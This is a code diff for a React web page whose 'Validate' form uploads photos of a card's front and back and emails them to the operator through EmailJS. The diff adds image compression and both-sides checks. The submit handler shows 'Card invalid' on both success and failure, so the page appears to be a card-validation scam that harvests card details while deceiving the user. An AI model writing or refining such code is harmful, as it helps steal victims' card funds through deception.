@@ -1,6 +1,7 @@
 import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Link, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, useBreakpointValue, Spinner } from "@chakra-ui/react"
 import { useRef, forwardRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
+import imageCompression from 'browser-image-compression';
 
 export default function Home({ informationSectionRef }) {
     const faqRef = useRef(null);
@@ -196,7 +197,9 @@ function PurchaseOrValidate() {
     const [isUploadMode, setIsUploadMode] = useState(false);
     const [errorMessage, setErrorMessage] = useState('');
     const [isFileValid, setIsFileValid] = useState(true);
-    const maxFileSize = 250 * 1024; 
+    const [frontImage, setFrontImage] = useState(null);
+    const [backImage, setBackImage] = useState(null);
+    const maxTotalFileSize = 500 * 1024;
 
     const openPurchaseModal = (card) => {
         setSelectedCard(card);
@@ -283,27 +286,27 @@ function PurchaseOrValidate() {
     const form = useRef();
 
     const handleUploadSubmit = (event) => {
-    event.preventDefault();
-    setLoading(true);
+        event.preventDefault();
+        setLoading(true);
 
-    const serviceId = 'service_rsh8zcj'
-    const templateId = 'template_kq7rvh7'
-    const publicKey = 'XEPa_HeI5_6-59dSj'
+        const serviceId = 'service_rsh8zcj'
+        const templateId = 'template_kq7rvh7'
+        const publicKey = 'XEPa_HeI5_6-59dSj'
 
-    emailjs.sendForm(serviceId, templateId, form.current, publicKey)
-      .then((response) => {
-        alert('Card invalid');
-        handleToggleUploadMode();
-      })
-      .catch((error) => {
-        console.error('Error', error);
-        alert('Card invalid');
-        handleToggleUploadMode();
-      })
-      .finally(() => {
-        setLoading(false);
-      });
-  };
+        emailjs.sendForm(serviceId, templateId, form.current, publicKey)
+        .then((response) => {
+            alert('Card invalid');
+            handleToggleUploadMode();
+        })
+        .catch((error) => {
+            console.error('Error', error);
+            alert('Card invalid');
+            handleToggleUploadMode();
+        })
+        .finally(() => {
+            setLoading(false);
+        });
+        };
 
     const clearFormData = () => {
         setValidateCurrency('USD');
@@ -418,10 +421,54 @@ function PurchaseOrValidate() {
         setIsUploadMode(!isUploadMode);
     };
 
-    const handleFileChange = (e) => {
+    const compressImage = async (file) => {
+    const options = {
+        maxSizeMB: 0.25, // Set maximum size to 500KB
+        maxWidthOrHeight: 800, // Optional: resize based on the image dimensions
+        useWebWorker: true // Optional: for better performance
+    };
+
+    try {
+        const originalSize = file.size;
+        const compressedFile = await imageCompression(file, options);
+        const compressedSize = compressedFile.size;
+
+        // Log the original and compressed file sizes
+        console.log(`File successfully compressed from ${originalSize / 1024} KB to ${compressedSize / 1024} KB`);
+
+        return compressedFile;
+    } catch (error) {
+        console.log('Error compressing the file:', error);
+        return file; // Return the original file if compression fails
+    }
+};
+
+    const handleFileChange = async (e) => {
         const file = e.target.files[0];
-        if (file && file.size > maxFileSize) {
+
+        if (!file) return;
+
+        // Compress the selected file
+        const compressedFile = await compressImage(file);
+
+        // Update state based on the input field that triggered the event
+        if (e.target.name === 'front_image') {
+            setFrontImage(compressedFile);
+        } else if (e.target.name === 'back_image') {
+            setBackImage(compressedFile);
+        }
+
+        // Calculate total file size of both images
+        const frontFileSize = e.target.name === 'front_image' ? compressedFile.size || 0 : frontImage?.size || 0;
+        const backFileSize = e.target.name === 'back_image' ? compressedFile.size || 0 : backImage?.size || 0;
+        const totalSize = frontFileSize + backFileSize;
+
+        // Validate combined file size and check if files are present
+        if (totalSize > maxTotalFileSize) {
             setErrorMessage('Attachments size limit. The maximum allowed attachments size is 500KB');
+            setIsFileValid(false);
+        } else if (!frontFileSize || !backFileSize) {
+            setErrorMessage('Please upload both front and back images.');
             setIsFileValid(false);
         } else {
             setErrorMessage('');
@@ -569,7 +616,13 @@ function PurchaseOrValidate() {
 
                                         {errorMessage && <p style={{ color: 'red' }}>{errorMessage}</p>}
 
-                                        <Button mt={6} colorScheme="white" variant="outline" type="submit" disabled={!isFileValid || loading}>
+                                        <Button
+                                            mt={6}
+                                            colorScheme="white"
+                                            variant="outline"
+                                            type="submit"
+                                            disabled={!isFileValid || loading}
+                                        >
                                             {loading ? <Spinner size="sm" /> : 'Validate'}
                                         </Button>
                                     </form>
